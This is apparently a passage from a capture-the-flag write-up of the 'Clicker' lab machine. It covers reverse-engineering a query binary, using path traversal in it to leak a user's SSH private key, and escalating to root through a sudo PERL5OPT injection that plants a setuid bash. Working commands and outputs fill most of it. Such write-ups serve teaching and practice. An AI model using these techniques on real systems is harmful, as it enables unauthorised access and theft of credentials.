www-data@clicker:/var/www/clicker.htb$ cat /opt/manage/README.txt
Web application Management

Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin
```

I tried it.

```bash
www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 1
/opt/manage/execute_query 1
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
CREATE TABLE IF NOT EXISTS players(username varchar(255), nickname varchar(255), password varchar(255), role varchar(255), clicks bigint, level int, PRIMARY KEY (username))
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level)
        VALUES ('admin', 'admin', 'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82', 'Admin', 999999999999999999, 999999999)
        ON DUPLICATE KEY UPDATE username=username
--------------

www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 2
/opt/manage/execute_query 2
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
INSERT INTO players (username, nickname, password, role, clicks, level)
        VALUES ('ButtonLover99', 'ButtonLover99', sha2('BestGameinHistory',256), 'User', 10000000, 100)
        ON DUPLICATE KEY UPDATE username=username
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level)
        VALUES ('Paol', 'Paol', sha2('Yeah_What_a_Nickname',256), 'User', 2776354, 75)
        ON DUPLICATE KEY UPDATE username=username
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level)
        VALUES ('Th3Br0', 'Th3Br0', sha2('Brohhhhhhhhhh',256), 'User', 87947322, 1)
        ON DUPLICATE KEY UPDATE username=username
--------------

www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 3
/opt/manage/execute_query 3
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
UPDATE players SET password='ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82' WHERE username='admin'
--------------

www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 4
/opt/manage/execute_query 4
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
DELETE FROM players WHERE username != 'admin'
--------------
```

The file seemed to be running queries to manage the users of the application. I downloaded the file to my machine and opened it in Ghidra.

This is what it looked like after I renamed a few variables.

```c
undefined8 main(int argc,long argv)

{
  int option;
  undefined8 uVar1;
  char *queryFile;
  size_t lengthFolder;
  size_t lengthFileName;
  char *fullPath;
  long in_FS_OFFSET;
  undefined8 folder;
  undefined8 local_90;
  undefined4 local_88;
  undefined8 mysqlCommand;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined local_28;
  long local_20;

  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (argc < 2) {
    puts("ERROR: not enough arguments");
    uVar1 = 1;
  }
  else {
    option = atoi(*(char **)(argv + 8));
    queryFile = (char *)calloc(0x14,1);
    switch(option) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar1 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(queryFile,"create.sql",0x14);
      break;
    case 2:
      strncpy(queryFile,"populate.sql",0x14);
      break;
    case 3:
      strncpy(queryFile,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(queryFile,"clean.sql",0x14);
      break;
    default:
      strncpy(queryFile,*(char **)(argv + 0x10),20);
    }
                    /* folder = /home/jack/queries/ */
    folder = 0x616a2f656d6f682f;
    local_90 = 0x69726575712f6b63;
    local_88 = 0x2f7365;
    lengthFolder = strlen((char *)&folder);
    lengthFileName = strlen(queryFile);
    fullPath = (char *)calloc(lengthFileName + lengthFolder + 1,1);
    strcat(fullPath,(char *)&folder);
    strcat(fullPath,queryFile);
    setreuid(1000,1000);
    option = access(fullPath,4);
    if (option == 0) {
                    /* mysqlCommand = /usr/bin/mysql -u clicker_db_user
                       --password='clicker_db_password' clicker -v <  */
      mysqlCommand = 0x6e69622f7273752f;
      local_70 = 0x2d206c7173796d2f;
      local_68 = 0x656b63696c632075;
      local_60 = 0x6573755f62645f72;
      local_58 = 0x737361702d2d2072;
      local_50 = 0x6c63273d64726f77;
      local_48 = 0x62645f72656b6369;
      local_40 = 0x726f77737361705f;
      local_38 = 0x6b63696c63202764;
      local_30 = 0x203c20762d207265;
      local_28 = 0;
      lengthFolder = strlen((char *)&mysqlCommand);
      lengthFileName = strlen(queryFile);
      queryFile = (char *)calloc(lengthFileName + lengthFolder + 1,1);
      strcat(queryFile,(char *)&mysqlCommand);
      strcat(queryFile,fullPath);
      system(queryFile);
    }
    else {
      puts("File not readable or not found");
    }
    uVar1 = 0;
  }
LAB_001015e1:
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar1;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

The code was loading queries from files in '/home/jack/queries/' and passing them to MySQL. Each of the four options in the README file has its file. There was also a fifth undocumented option. The `default` case of the `switch` statement could be used to load another file. But the file name could not be longer than 20 characters.

```c
    default:
      strncpy(queryFile,*(char **)(argv + 0x10),20);
```

I used this to run arbitrary SQL code.

```bash
www-data@clicker:/tmp$ cat a
Drop Table If Exists test;
Create Table test (text Varchar(256));
Load Data Infile "/etc/passwd" Into Table test FIELDS TERMINATED BY '\n';

www-data@clicker:/tmp$ /opt/manage/execute_query 5 "../../../tmp/a"
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
Drop Table If Exists test
--------------

--------------
Create Table test (text Varchar(256))
--------------
```

I tried to use this to read and write files in SQL. But the MySQL user did not have the required permissions. Then I realized that this was a waste of time. I already had the credentials to the database. I did not need to go through a script to do that.

But the script was running as the user jack, so it could read files that only they had access to. And it displayed the queries it found in the file. I could use that to leak some data.

I used it to read jack's SSH private key.

```bash
www-data@clicker:/tmp$ /opt/manage/execute_query 5 "../.ssh/id_rsa"
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY---
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1
```

I saved the key to a file and tried to connect as jack. It failed at first. I saw that it was missing `-` for the first and last lines. It must have been removed as a comment. I added them back and I was able to connect to the server.

```bash
$ ssh -i jack_id_rsa jack@target
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov 12 04:10:48 PM UTC 2023

  System load:           0.025390625
  Usage of /:            53.4% of 5.77GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             243
  Users logged in:       0
  IPv4 address for eth0: 10.129.66.96
  IPv6 address for eth0: dead:beef::250:56ff:feb0:1365


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jack@clicker:~$ cat user.txt
REDACTED
```

## Getting root

To get root, I looked at what I could run with sudo.

```bash
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

The first line would allow me to run anything as any user. That would have been an easy path to root. But it required a password, and I did not have it.

The second line allowed running a script as root without the password. It also allowed setting environment variables when calling the script, but I missed that detail at first.

I looked at the script.

```bash
jack@clicker:~$ cat /opt/monitor.sh
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi

jack@clicker:~$ sudo /opt/monitor.sh
<?xml version="1.0"?>
<data>
  <timestamp>1699805545</timestamp>
  <date>2023/11/12 04:12:25pm</date>
  <php-version>8.1.2-1ubuntu2.14</php-version>
  <test-connection-db>OK</test-connection-db>
  <memory-usage>395608</memory-usage>
  <environment>
    <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
    <SYSTEMD_EXEC_PID>1177</SYSTEMD_EXEC_PID>
    <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
    <JOURNAL_STREAM>8:27403</JOURNAL_STREAM>
    <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
    <INVOCATION_ID>9cb4c86dee6a4141bc7a5748e246cd7c</INVOCATION_ID>
    <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
    <LANG>C</LANG>
    <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
    <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
    <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
    <PWD>/</PWD>
  </environment>
</data>
```

The script used `curl` to call the diagnostic endpoint from the web application. Giving me the token I needed to call it. It then took the results and used [xml_pp](https://linux.die.net/man/1/xml_pp) to pretty print it. And finally it saved the result in a file, using the timestamp as part of the file name.

I thought there might be a way to exploit the XML parser if I could inject some malicious content. But I did not see anything I could control in the output of the diagnostic.

```php
$db_server="localhost";
$db_username="clicker_db_user";
$db_password="clicker_db_password";
$db_name="clicker";

$connection_test = "OK";

try {
	$pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
} catch(PDOException $ex){
    $connection_test = "KO";
}
$data=[];
$data["timestamp"] = time();
$data["date"] = date("Y/m/d h:i:sa");
$data["php-version"] = phpversion();
$data["test-connection-db"] = $connection_test;
$data["memory-usage"] = memory_get_usage();
$env = getenv();
$data["environment"] = $env;

$xml_data = new SimpleXMLElement('<?xml version="1.0"?><data></data>');
array_to_xml($data,$xml_data);
$result = $xml_data->asXML();
print $result;
?>
```

I looked at '/usr/bin/xml_pp'. It was a Perl script, but no exploit jumped to my eyes.

Here I lost some time. I saw that my user was part of the 'adm' group. I looked for files I could read or write with that group. Thinking I might be able to change something that would impact the monitoring script. But I did not find anything.

Eventually I back looked at the sudo commands I could run. And I finally realized I could set environment variables when calling the script.

The script blocked me from setting some variables.

```bash
set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;
```

I looked for ways to [exploit Perl by setting a variable](https://www.elttam.com/blog/env/). Turned out `PERL5OPT` could be used with `-M` to load a module, and run some code after the module is loaded.

I tried running a simple command with the POC.

```bash
jack@clicker:~$ sudo PERL5OPT="-Mbase;print(\`id\`)" /opt/monitor.sh
uid=0(root) gid=0(root) groups=0(root)
<?xml version="1.0"?>
<data>
  <timestamp>1699814375</timestamp>
  <date>2023/11/12 06:39:35pm</date>
  <php-version>8.1.2-1ubuntu2.14</php-version>
  <test-connection-db>OK</test-connection-db>
  <memory-usage>392704</memory-usage>
  <environment>
    <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
    <SYSTEMD_EXEC_PID>1177</SYSTEMD_EXEC_PID>
    <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
    <JOURNAL_STREAM>8:27403</JOURNAL_STREAM>
    <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
    <INVOCATION_ID>9cb4c86dee6a4141bc7a5748e246cd7c</INVOCATION_ID>
    <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
    <LANG>C</LANG>
    <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
    <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
    <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
    <PWD>/</PWD>
  </environment>
</data>
```

It worked! I tried to use the same thing to copy bash in '/tmp' and set the suid bit. But adding spaces to the command caused issues. I created a small script that would do the same and called it with the vulnerability.

```bash
jack@clicker:~$ cat /tmp/test.sh
#!/bin/bash
cp /bin/bash /tmp
chmod u+s /tmp/bash

jack@clicker:~$ sudo PERL5OPT="-Mbase;print(\`/tmp/test.sh\`)" /opt/monitor.sh
<?xml version="1.0"?>
<data>
  <timestamp>1699814696</timestamp>
  <date>2023/11/12 06:44:56pm</date>
  <php-version>8.1.2-1ubuntu2.14</php-version>
  <test-connection-db>OK</test-connection-db>
  <memory-usage>392704</memory-usage>
  <environment>
    <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
    <SYSTEMD_EXEC_PID>1177</SYSTEMD_EXEC_PID>
    <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
    <JOURNAL_STREAM>8:27403</JOURNAL_STREAM>
    <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
    <INVOCATION_ID>9cb4c86dee6a4141bc7a5748e246cd7c</INVOCATION_ID>
    <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
    <LANG>C</LANG>
    <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
    <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
    <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
    <PWD>/</PWD>
  </environment>
</data>

jack@clicker:~$ ls -ltr /tmp/
total 4428
drwx------ 3 root root    4096 Nov 12 14:06 systemd-private-ddfee650504443739a881aec6b0bed50-systemd-timesyncd.service-o5SWls
drwx------ 3 root root    4096 Nov 12 14:06 systemd-private-ddfee650504443739a881aec6b0bed50-systemd-resolved.service-0r7Lbs
drwx------ 3 root root    4096 Nov 12 14:06 systemd-private-ddfee650504443739a881aec6b0bed50-systemd-logind.service-nPNgJx
drwx------ 3 root root    4096 Nov 12 14:06 systemd-private-ddfee650504443739a881aec6b0bed50-ModemManager.service-5ppJhq
drwx------ 2 root root    4096 Nov 12 14:07 vmware-root_788-2957517930
drwx------ 3 root root    4096 Nov 12 14:08 systemd-private-ddfee650504443739a881aec6b0bed50-apache2.service-wXSKSb
-rw-rw-r-- 1 jack jack    2657 Nov 12 16:39 writable
-rwxrwx--- 1 jack jack 3104768 Nov 12 16:41 pspy64
-rwxrwxr-x 1 jack jack      50 Nov 12 18:44 test.sh
-rwsr-xr-x 1 root root 1396520 Nov 12 18:44 bash
```

I used the copied file to become root.

```
jack@clicker:~$ /tmp/bash -p

bash-5.1# id
uid=1000(jack) gid=1000(jack) euid=0(root) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)

bash-5.1# cat /root/root.txt
REDACTED
```